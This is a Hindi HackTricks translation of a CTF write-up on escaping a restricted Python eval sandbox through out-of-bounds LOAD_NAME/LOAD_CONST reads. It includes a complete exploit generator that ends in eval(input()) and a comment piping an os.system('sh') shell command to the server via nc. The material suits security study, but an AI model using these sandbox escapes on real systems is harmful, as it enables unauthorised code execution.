# LOAD_NAME / LOAD_CONST ऑपकोड OOB पठन

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

**यह जानकारी** [**इस लेख से ली गई थी**](https://blog.splitline.tw/hitcon-ctf-2022/)**।**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

हम LOAD_NAME / LOAD_CONST ऑपकोड में OOB पठन की सुविधा का उपयोग कर सकते हैं ताकि हम कुछ प्रतीक मेमोरी में प्राप्त कर सकें। जिसका मतलब है आप चाहते हैं कि किसी प्रतीक (जैसे कि फ़ंक्शन का नाम) को प्राप्त करने के लिए `(a, b, c, ... सैकड़ों प्रतीक ..., __getattribute__) if [] else [].__getattribute__(...)` जैसे चालाकी का उपयोग करें।

फिर अपना एक्सप्लॉइट तैयार करें।

### अवलोकन <a href="#overview-1" id="overview-1"></a>

स्रोत कोड बहुत छोटा है, केवल 4 लाइन हैं!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
आप विषयस्थ Python कोड इनपुट कर सकते हैं, और यह [Python कोड ऑब्जेक्ट](https://docs.python.org/3/c-api/code.html) में कंपाइल हो जाएगा। हालांकि, उस कोड ऑब्जेक्ट के `co_consts` और `co_names` को eval करने से पहले खाली टपल के साथ बदल दिया जाएगा।

इस प्रकार, सभी अभिव्यक्ति जिसमें consts (जैसे संख्याएँ, स्ट्रिंग्स आदि) या नाम (जैसे वेरिएबल्स, फंक्शन्स) शामिल हो सकती हैं, उसका अंत में सेगमेंटेशन फॉल्ट हो सकता है।

### बाउंडरी के बाहर पठन <a href="#out-of-bound-read" id="out-of-bound-read"></a>

सेगफॉल्ट कैसे होता है?

एक सरल उदाहरण के साथ शुरू करें, `[a, b, c]` निम्नलिखित बाइटकोड में कंपाइल हो सकता है।
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
लेकिन अगर `co_names` खाली टपल बन जाए? `LOAD_NAME 2` ऑपकोड फिर भी क्रियान्वित होता है, और उस मेमोरी पते से मान को पढ़ने की कोशिश करता है जिस पर यह मूल रूप से होना चाहिए था। हाँ, यह एक आउट-ऑफ-बाउंड पठन "सुविधा" है।

समाधान के लिए मूल अवधारणा सरल है। CPython में कुछ ऑपकोड जैसे `LOAD_NAME` और `LOAD_CONST` खुलासे के लिए OOB पठन के लिए भेद्य (?) हैं।

वे `consts` या `names` टपल से अनुक्रम `oparg` से एक ऑब्जेक्ट पुनः प्राप्त करते हैं (जो `co_consts` और `co_names` को अंदर से नामित किया जाता है)। हम `LOAD_CONST` के बारे में निम्नलिखित छोटे स्निपेट का संदर्भ ले सकते हैं ताकि हम देख सकें कि CPython `LOAD_CONST` ऑपकोड को प्रोसेस करते समय क्या करता है।
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
इस तरह हम OOB सुविधा का उपयोग करके किसी भी मेमोरी ऑफसेट से "नाम" प्राप्त कर सकते हैं। यह सुनिश्चित करने के लिए कि उस नाम का क्या है और इसका ऑफसेट क्या है, बस `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... को कोशिश करते रहें। और आपको लगभग oparg > 700 में कुछ मिल सकता है। आप मेमोरी लेआउट को देखने के लिए gdb का उपयोग भी कर सकते हैं, लेकिन मुझे लगता है कि यह और अधिक सरल नहीं होगा?

### उत्पादन उत्पन्न करना <a href="#generating-the-exploit" id="generating-the-exploit"></a>

जब हम उन उपयोगी ऑफसेट प्राप्त कर लेते हैं नाम / स्थिर, तो हम उस ऑफसेट से नाम / स्थिर कैसे प्राप्त करें और उसका उपयोग करें? यहां एक चाल है आपके लिए:\
चलो मान लेते हैं हम ऑफसेट 5 (`LOAD_NAME 5`) से `__getattribute__` नाम प्राप्त कर सकते हैं `co_names=()` के साथ, तो बस निम्नलिखित काम करें:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> ध्यान दें कि इसे `__getattribute__` के रूप में नाम देना आवश्यक नहीं है, आप इसे कुछ छोटा या अधिक अजीब नाम दे सकते हैं।

आप इसके bytecode को देखकर कारण को समझ सकते हैं:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
ध्यान दें कि `LOAD_ATTR` भी `co_names` से नाम प्राप्त करता है। Python नाम को एक ही ऑफसेट से लोड करता है अगर नाम समान है, इसलिए दूसरा `__getattribute__` भी ऑफसेट=5 से लोड होता है। इस सुविधा का उपयोग करके हम जब नाम मेमोरी के पास होता है तो एकाधिक नाम का उपयोग कर सकते हैं।

नंबर उत्पन्न करने के लिए सरल होना चाहिए:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### शात्र स्क्रिप्ट <a href="#exploit-script-1" id="exploit-script-1"></a>

मैंने लंबाई सीमा के कारण स्थिरों का उपयोग नहीं किया।

पहले यहाँ एक स्क्रिप्ट है जिसका हमें उन नामों के ऑफसेट पता करने के लिए करना है।
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
और निम्नलिखित वास्तविक पायथन शोषण उत्पन्न करने के लिए है।
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
यह मुख्य रूप से निम्नलिखित कार्रवाई करता है, उन स्ट्रिंग्स के लिए जो हम `__dir__` विधि से प्राप्त करते हैं:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
एडब्ल्यूएस हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण एडब्ल्यूएस रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
जीसीपी हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण जीसीपी रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या हमें ट्विटर पर फॉलो करें 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में पीआर जमा करके हैकिंग ट्रिक्स साझा करें।

</details>
{% endhint %}
